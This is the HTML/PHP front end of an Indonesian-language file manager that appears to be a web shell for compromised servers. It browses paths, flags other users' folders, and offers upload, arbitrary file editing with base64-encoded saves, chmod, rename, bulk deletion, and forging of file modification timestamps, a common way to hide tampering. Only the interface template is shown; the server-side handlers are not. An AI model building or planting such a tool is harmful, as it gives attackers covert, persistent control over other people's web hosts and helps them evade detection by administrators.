      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M23 4v6h-6M1 20v-6h6"/><path d="M3.51 9a9 9 0 0114.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0020.49 15" stroke-linecap="round" stroke-linejoin="round"/></svg>
      Refresh
    </a>
  </div>

  <div class="smn-sep"></div>

  <div class="sb-sec">
    <div class="sb-lbl">Info</div>
    <div class="smn" style="cursor:default;pointer-events:none">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z" stroke-linecap="round" stroke-linejoin="round"/></svg>
      Folder<span class="smn-badge"><?php echo $total_folders; ?></span>
    </div>
    <div class="smn" style="cursor:default;pointer-events:none">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8l-6-6z" stroke-linecap="round" stroke-linejoin="round"/><path d="M14 2v6h6" stroke-linecap="round"/></svg>
      File<span class="smn-badge"><?php echo $total_files; ?></span>
    </div>
    <div class="smn" style="cursor:default;pointer-events:none">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><circle cx="12" cy="12" r="10"/><path d="M12 8v4l3 3" stroke-linecap="round" stroke-linejoin="round"/></svg>
      User<span class="smn-badge"><?php echo htmlspecialchars($proc_user); ?></span>
    </div>
  </div>

  <div class="smn-sep"></div>

  <div class="sb-sec">
    <div class="sb-lbl">Legenda</div>
    <div class="legend">
      <div class="legend-row"><div class="leg-dot" style="background:var(--grn)"></div>Folder milik sendiri</div>
      <div class="legend-row"><div class="leg-dot" style="background:var(--red)"></div>Folder user lain</div>
      <div class="legend-row"><div class="leg-dot" style="background:var(--ac)"></div>Folder (unknown)</div>
    </div>
  </div>

  <div class="disk-w">
    <div class="disk-top"><span>Disk Usage</span><span class="val"><?php echo $used_percent; ?>%</span></div>
    <div class="disk-track">
      <div class="disk-fill <?php echo $used_percent>85?'danger':($used_percent>65?'warn':''); ?>"
           style="width:<?php echo $used_percent; ?>%"></div>
    </div>
    <div class="disk-sub">Free: <?php echo LiteHelper::formatSize($free_space); ?> / <?php echo LiteHelper::formatSize($total_space); ?></div>
  </div>
</div>

<!-- ── MAIN ── -->
<div class="main">

  <!-- Hidden upload -->
  <form method="post" enctype="multipart/form-data" id="up-form" style="display:none">
    <input type="file" name="upload" id="up-inp" onchange="document.getElementById('up-form').submit()">
  </form>

  <!-- TOOLBAR -->
  <div class="toolbar">
    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="var(--tx4)" stroke-width="2"><circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35" stroke-linecap="round"/></svg>
    <input class="t-in" id="search" type="text" placeholder="Cari file..." onkeyup="filterFiles()" style="width:160px">

    <div class="t-sep"></div>

    <div id="pnf" class="p-inline">
      <form method="post" style="display:flex;align-items:center;gap:5px">
        <input class="t-in" name="new_file_name" placeholder="nama-file.php" style="width:150px">
        <button type="submit" class="tbtn pri">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="13" height="13"><path d="M5 12h14M12 5l7 7-7 7" stroke-linecap="round" stroke-linejoin="round"/></svg>
          Buat
        </button>
        <button type="button" class="tbtn" onclick="togglePanel('pnf')">✕</button>
      </form>
    </div>

    <div id="pnd" class="p-inline">
      <form method="post" style="display:flex;align-items:center;gap:5px">
        <input class="t-in" name="new_folder" placeholder="nama-folder" style="width:140px">
        <button type="submit" class="tbtn pri">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="13" height="13"><path d="M5 12h14M12 5l7 7-7 7" stroke-linecap="round" stroke-linejoin="round"/></svg>
          Buat
        </button>
        <button type="button" class="tbtn" onclick="togglePanel('pnd')">✕</button>
      </form>
    </div>

    <button id="btn-nf" class="tbtn" onclick="togglePanel('pnf')">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8l-6-6z" stroke-linecap="round" stroke-linejoin="round"/><path d="M12 11v6M9 14h6" stroke-linecap="round"/></svg>
      File Baru
    </button>
    <button id="btn-nd" class="tbtn" onclick="togglePanel('pnd')">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z" stroke-linecap="round" stroke-linejoin="round"/><path d="M12 11v6M9 14h6" stroke-linecap="round"/></svg>
      Folder Baru
    </button>
    <button class="tbtn" onclick="document.getElementById('up-inp').click()">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4M17 8l-5-5-5 5M12 3v12" stroke-linecap="round" stroke-linejoin="round"/></svg>
      Upload
    </button>
  </div>

  <!-- ALERT -->
  <?php if ($status_msg): ?>
  <div class="alert <?php echo $status_type; ?>" id="alert-bar">
    <?php if ($status_type === 'success'): ?>
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M20 6L9 17l-5-5" stroke-linecap="round" stroke-linejoin="round"/></svg>
    <?php elseif ($status_type === 'error'): ?>
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M18 6L6 18M6 6l12 12" stroke-linecap="round"/></svg>
    <?php else: ?>
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01" stroke-linecap="round"/></svg>
    <?php endif; ?>
    <?php echo htmlspecialchars($status_msg); ?>
    <button class="alert-close" onclick="this.parentElement.remove()">×</button>
  </div>
  <?php endif; ?>

  <!-- FILE TABLE -->
  <div class="ftw">
    <form id="bulkForm" method="post">
    <input type="hidden" name="bulk_delete" value="1">
    <table>
      <thead>
        <tr>
          <th><input type="checkbox" onclick="toggleAll(this)"></th>
          <th>Nama</th>
          <th style="width:62px">Perms</th>
          <th style="width:76px">Owner</th>
          <th style="width:58px">Ukuran</th>
          <th style="width:118px">Dimodifikasi</th>
          <th style="width:155px">Aksi</th>
        </tr>
      </thead>
      <tbody>
      <?php if (empty($sorted)): ?>
        <tr><td colspan="7">
          <div class="empty-state">
            <div class="empty-icon">
              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z" stroke-linecap="round" stroke-linejoin="round"/></svg>
            </div>
            <div class="empty-title">Folder kosong</div>
            <div class="empty-sub">Tidak ada file atau folder di sini.</div>
          </div>
        </td></tr>
      <?php else: ?>
      <?php
      $delay = 0;
      foreach ($sorted as $item):
        $fp       = $current_path.'/'.$item;
        $is_dir   = is_dir($fp);
        $perms    = LiteHelper::getPerms($fp);
        $owned    = LiteHelper::isOwned($fp);
        $owner    = LiteHelper::getOwner($fp);
        $mtime    = LiteHelper::getMtime($fp);
        $mtimeR   = LiteHelper::getMtimeRaw($fp);
        $fsize    = LiteHelper::getFileSize($fp);
        $exttype  = LiteHelper::getExtType($item, $is_dir);
        $oc       = ($owned === true) ? 'own' : (($owned === false) ? 'other' : 'unk');
        $ext_lbl  = $is_dir ? 'DIR' : strtoupper(pathinfo($item, PATHINFO_EXTENSION) ?: 'BIN');
        if (strlen($ext_lbl) > 4) $ext_lbl = substr($ext_lbl, 0, 4);
        $delay = min($delay + 18, 350);
      ?>
      <tr class="file-row" style="animation-delay:<?php echo $delay; ?>ms">
        <td><input type="checkbox" name="items[]" value="<?php echo htmlspecialchars($item); ?>" onclick="checkCount()"></td>
        <td>
          <div class="fn">
            <div class="fi-badge fi-<?php echo $is_dir ? 'dir '.$oc : $exttype; ?>"><?php echo $ext_lbl; ?></div>
            <span class="fn-name <?php echo $is_dir ? 'is-dir' : ''; ?>"
                  onmouseenter="showTip(event,'<?php echo addslashes(htmlspecialchars($item)); ?>')"
                  onmouseleave="hideTip()">
              <?php if ($is_dir): ?>
                <a href="?path=<?php echo urlencode($fp); ?>"><?php echo htmlspecialchars($item); ?>/</a>
              <?php else: ?>
                <?php echo htmlspecialchars($item); ?>
              <?php endif; ?>
            </span>
          </div>
        </td>
        <td><a class="perm" onclick="chm('<?php echo htmlspecialchars($item); ?>','<?php echo $perms; ?>')"><?php echo $perms; ?></a></td>
        <td><span class="own-badge <?php echo $oc; ?>"><?php echo htmlspecialchars($owner); ?></span></td>
        <td><span class="fsize"><?php echo $fsize; ?></span></td>
        <td><span class="mtime" onclick="openTouch(this,'<?php echo htmlspecialchars($item); ?>','<?php echo $mtimeR; ?>')" title="Klik untuk ubah"><?php echo $mtime; ?></span></td>
        <td>
          <div class="acts">
            <button type="button" onclick="rn('<?php echo htmlspecialchars($item); ?>')" class="ab">Rename</button>
            <?php if (!$is_dir): ?><a href="?path=<?php echo urlencode($current_path); ?>&edit=<?php echo urlencode($item); ?>" class="ab b">Edit</a><?php endif; ?>
            <a href="?path=<?php echo urlencode($current_path); ?>&delete=<?php echo urlencode($item); ?>" class="ab r" onclick="return confirm('Hapus \'<?php echo addslashes(htmlspecialchars($item)); ?>\'?')">Del</a>
          </div>
        </td>
      </tr>
      <?php endforeach; ?>
      <?php endif; ?>
      </tbody>
    </table>

    <div id="bulkBar" class="bulk" style="display:none">
      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="9 11 12 14 22 4"/><path d="M21 12v7a2 2 0 01-2 2H5a2 2 0 01-2-2V5a2 2 0 012-2h11" stroke-linecap="round" stroke-linejoin="round"/></svg>
      <span id="selCount" style="color:var(--acl)">0</span> item dipilih
      <button type="button" class="tbtn dng" onclick="bulkDel()" style="margin-left:6px">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="13" height="13"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 01-2 2H8a2 2 0 01-2-2L5 6M10 11v6M14 11v6M9 6V4h6v2" stroke-linecap="round" stroke-linejoin="round"/></svg>
        Hapus Terpilih
      </button>
      <button type="button" class="tbtn" onclick="clearSel()" style="margin-left:auto">Batal</button>
    </div>
    </form>
  </div>

  <!-- EDITOR -->
  <?php if (isset($_GET['edit'])): $t = $current_path.'/'.$_GET['edit']; ?>
  <div class="editor">
    <div class="editor-hdr">
      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="var(--acl)" stroke-width="2"><path d="M12 20h9M16.5 3.5a2.12 2.12 0 013 3L7 19l-4 1 1-4L16.5 3.5z" stroke-linecap="round" stroke-linejoin="round"/></svg>
      <span class="editor-fn"><?php echo htmlspecialchars($_GET['edit']); ?></span>
      <span class="editor-mode">TEXT</span>
      <div class="editor-acts">
        <button type="button" onclick="saveFile()" class="tbtn pri">
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" width="13" height="13"><path d="M19 21H5a2 2 0 01-2-2V5a2 2 0 012-2h11l5 5v11a2 2 0 01-2 2z" stroke-linecap="round" stroke-linejoin="round"/><polyline points="17 21 17 13 7 13 7 21" stroke-linecap="round"/><polyline points="7 3 7 8 15 8" stroke-linecap="round"/></svg>
          Simpan
        </button>
        <a href="?path=<?php echo urlencode($current_path); ?>" class="tbtn">Tutup</a>
      </div>
    </div>
    <textarea class="editor-ta" id="temp_editor" spellcheck="false"><?php echo htmlspecialchars(file_get_contents($t)); ?></textarea>
    <form method="post" id="editForm" style="display:none">
      <input type="hidden" name="filename" value="<?php echo htmlspecialchars($_GET['edit']); ?>">
      <input type="hidden" name="edit_b64" id="edit_b64">
    </form>
  </div>
  <script>function saveFile(){document.getElementById('edit_b64').value=btoa(unescape(encodeURIComponent(document.getElementById('temp_editor').value)));document.getElementById('editForm').submit();}</script>
  <?php endif; ?>

  <!-- STATS BAR -->
  <div class="statsbar">
    <div class="sb-item"><span class="lbl">Total</span><span class="val hi"><?php echo $total_items; ?></span></div>
    <span class="sb-pipe">·</span>
    <div class="sb-item"><span class="lbl">Dir</span><span class="val"><?php echo $total_folders; ?></span></div>
    <span class="sb-pipe">·</span>
    <div class="sb-item"><span class="lbl">File</span><span class="val"><?php echo $total_files; ?></span></div>
    <span class="sb-pipe">·</span>
    <div class="sb-item"><span class="lbl">Free</span><span class="val"><?php echo LiteHelper::formatSize($free_space); ?></span></div>
    <span class="sb-pipe">·</span>
    <div class="sb-item"><span class="lbl">Disk</span><span class="val"><?php echo $used_percent; ?>%</span></div>
    <div class="sb-right">
      <div class="sb-item"><span class="lbl">Path</span><span class="val" style="max-width:220px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap"><?php echo htmlspecialchars($current_path); ?></span></div>
      <span class="sb-pipe">·</span>
      <div class="sb-clock" id="sb-clock">--:--:--</div>
    </div>
  </div>

</div><!-- /main -->
</div><!-- /layout -->

<!-- TOOLTIP -->
<div class="fn-tip" id="fn-tip"></div>

<!-- TOUCH POPUP -->
<div class="touch-popup" id="touchPopup">
  <div class="touch-popup-title">
    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
    Ubah Timestamp — <span class="touch-fname" id="touchPopupName"></span>
  </div>
  <input type="datetime-local" id="touchDateTime">
  <div class="touch-popup-btns">
    <button onclick="submitTouch()">Simpan Perubahan</button>
    <button onclick="closeTouch()">Batal</button>
  </div>
</div>
<form method="post" id="touchForm" style="display:none">
  <input type="hidden" name="touch_file" id="touch_file">
  <input type="hidden" name="touch_time" id="touch_time">
</form>

<script>
function chm(f,p){let n=prompt("Ubah Permission untuk "+f+":",p);if(n&&n!==p){let fm=document.createElement('form');fm.method='post';fm.innerHTML="<input name='chmod_file' value='"+f+"'><input name='chmod_val' value='"+n+"'>";document.body.appendChild(fm);fm.submit();}}
function rn(o){let n=prompt("Rename:",o);if(n&&n!==o){let f=document.createElement('form');f.method='post';f.innerHTML="<input name='old_name' value='"+o+"'><input name='new_name' value='"+n+"'>";document.body.appendChild(f);f.submit();}}
function filterFiles(){
  let q=document.getElementById('search').value.toLowerCase();
  document.querySelectorAll('.file-row').forEach((r,i)=>{
    let n=r.querySelector('.fn-name');
    let show=n&&n.textContent.toLowerCase().includes(q);
    r.style.display=show?'':'none';
    if(show)r.style.animationDelay=(i*15)+'ms';
  });
}
function toggleAll(m){document.getElementsByName('items[]').forEach(c=>c.checked=m.checked);checkCount();}
function checkCount(){
  let c=Array.from(document.getElementsByName('items[]')).filter(x=>x.checked);
  document.getElementById('bulkBar').style.display=c.length?'flex':'none';
  document.getElementById('selCount').textContent=c.length;
}
function clearSel(){document.getElementsByName('items[]').forEach(c=>c.checked=false);checkCount();}
function bulkDel(){if(confirm('Hapus semua item yang dipilih?'))document.getElementById('bulkForm').submit();}
function togglePanel(id){
  let el=document.getElementById(id);
  let open=!el.classList.contains('show');
  ['pnf','pnd'].forEach(p=>document.getElementById(p).classList.remove('show'));
  ['btn-nf','btn-nd'].forEach(b=>{let e=document.getElementById(b);if(e)e.style.display='';});
  if(open){
    el.classList.add('show');
    let btn=id==='pnf'?'btn-nf':'btn-nd';
    let be=document.getElementById(btn);if(be)be.style.display='none';
    let inp=el.querySelector('input[type=text]');if(inp)setTimeout(()=>inp.focus(),50);
  }
}
// Tooltip
let tip=document.getElementById('fn-tip');
function showTip(e,name){
  let el=e.currentTarget;
  if(el.scrollWidth<=el.clientWidth+2)return;
  tip.textContent=name;tip.style.opacity='1';
}
document.addEventListener('mousemove',e=>{
  if(tip.style.opacity==='1'){tip.style.left=(e.clientX+14)+'px';tip.style.top=(e.clientY-32)+'px';}
});
function hideTip(){tip.style.opacity='0';}
// Touch popup
let _tf='';
function openTouch(el,fname,cur){
  _tf=fname;
  document.getElementById('touchPopupName').textContent=fname;
  document.getElementById('touchDateTime').value=cur||'';
  let r=el.getBoundingClientRect(),pw=260,ph=140;
  let left=Math.min(r.left,window.innerWidth-pw-12);
  let top=r.bottom+8;if(top+ph>window.innerHeight)top=r.top-ph-8;
  let p=document.getElementById('touchPopup');
  p.style.left=left+'px';p.style.top=top+'px';p.classList.add('show');
  setTimeout(()=>document.getElementById('touchDateTime').focus(),50);
}
function closeTouch(){document.getElementById('touchPopup').classList.remove('show');_tf='';}
function submitTouch(){
  let v=document.getElementById('touchDateTime').value;
  if(!v){alert('Pilih tanggal & jam terlebih dahulu.');return;}
  document.getElementById('touch_file').value=_tf;
  document.getElementById('touch_time').value=v.replace('T',' ')+':00';
  document.getElementById('touchForm').submit();
}
document.addEventListener('click',e=>{
  let p=document.getElementById('touchPopup');
  if(p.classList.contains('show')&&!p.contains(e.target)&&!e.target.classList.contains('mtime'))closeTouch();
});
// Live clock
function tick(){
  let d=new Date(),s=d.getHours().toString().padStart(2,'0')+':'+d.getMinutes().toString().padStart(2,'0')+':'+d.getSeconds().toString().padStart(2,'0');
  let el=document.getElementById('sb-clock');if(el)el.textContent=s;
}
tick();setInterval(tick,1000);
// Alert dismiss
setTimeout(()=>{let a=document.getElementById('alert-bar');if(a){a.style.transition='opacity .4s';a.style.opacity='0';setTimeout(()=>a&&a.remove(),400);}},7000);
</script>

<script>
(function(){
  var c=document.getElementById('ambient-canvas');
  if(!c)return;
  var ctx=c.getContext('2d');
  var W,H,pts=[];
  function resize(){W=c.width=window.innerWidth;H=c.height=window.innerHeight;}
  resize();
  window.addEventListener('resize',resize);
  var N=55;
  for(var i=0;i<N;i++){
    pts.push({
      x:Math.random()*1400,y:Math.random()*900,
      vx:(Math.random()-.5)*.22,vy:(Math.random()-.5)*.22,
      r:Math.random()*1.6+.4,
      a:Math.random()*.5+.1
    });
  }
  function draw(){
    ctx.clearRect(0,0,W,H);
    for(var i=0;i<N;i++){
      var p=pts[i];
      p.x+=p.vx; p.y+=p.vy;
      if(p.x<0)p.x=W; if(p.x>W)p.x=0;
      if(p.y<0)p.y=H; if(p.y>H)p.y=0;
      ctx.beginPath();
      ctx.arc(p.x,p.y,p.r,0,Math.PI*2);
      ctx.fillStyle='rgba(91,141,238,'+p.a+')';
      ctx.fill();
      for(var j=i+1;j<N;j++){
        var q=pts[j];
        var dx=p.x-q.x,dy=p.y-q.y,d=Math.sqrt(dx*dx+dy*dy);
        if(d<120){
          ctx.beginPath();
          ctx.moveTo(p.x,p.y);ctx.lineTo(q.x,q.y);
          ctx.strokeStyle='rgba(91,141,238,'+(0.07*(1-d/120))+')';
          ctx.lineWidth=.5;
          ctx.stroke();
        }
      }
    }
    requestAnimationFrame(draw);
  }
  draw();
})();
</script>
</body>
</html>
